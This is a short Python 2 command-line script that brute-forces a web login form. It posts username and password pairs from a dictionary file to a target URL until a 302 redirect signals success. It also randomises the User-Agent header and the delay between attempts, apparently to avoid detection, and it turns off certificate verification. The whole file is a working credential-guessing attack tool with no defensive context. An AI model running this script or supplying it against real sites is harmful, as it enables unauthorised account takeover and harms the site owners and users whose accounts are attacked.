import random
from fake_useragent import UserAgent
import requests
from requests_toolbelt.utils import dump
import sys
import time
import optparse

GRE = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'


def postrequest(url,user_name,password,user_agent):
    formdata = {'user_name':user_name,'password':password,'Login':'Login'}
    req = requests.post(url,data=formdata,headers={'User-Agent':user_agent},verify=False)
    print user_agent
#    print dump.dump_all(req).decode('utf-8')
    return req

def judge(res):
    if not res.history:
        print RED+"login failed"+ENDC
    elif res.history[0].status_code == 302:
        print GRE+"login success"+ENDC
        return 0

def main():
    parser = optparse.OptionParser()
    parser.add_option("-u","--url",dest="url",metavar="URL",help="specify URL starts with schema(http(s)://)")
    parser.add_option("-f","--file",dest="dictfile",metavar="FILE",help="specify dictionary file of which content comma separated username and password are listed")
    parser.add_option("-s","--minsleep",dest="min",metavar="MIN_SLEEP_TIME",help="specify minimum sleep seconds, default=0",default=0)
    parser.add_option("-e","--maxsleep",dest="max",metavar="MAX_SLEEP_TIME",help="specify max sleep seconds, default=5",default=5)
    options, args = parser.parse_args()

    if not options.url:
        sys.exit("-u url is required please see help -h")
    if not options.dictfile:
        sys.exit("-f dictfile is required please see help -h")
    if options.min > options.max:
        sys.exit("-s must be smaller than -e please see help -h")

    ua = UserAgent()
    with open(options.dictfile) as f:
        for l in f:
            if judge(postrequest(options.url,l.split(',')[0],l.split(',')[1].rstrip('\n'),ua.random)) != 0:
                time.sleep(random.randrange(options.min,options.max))
                continue
            else:
                print l
                break
if __name__ == "__main__":
    main()
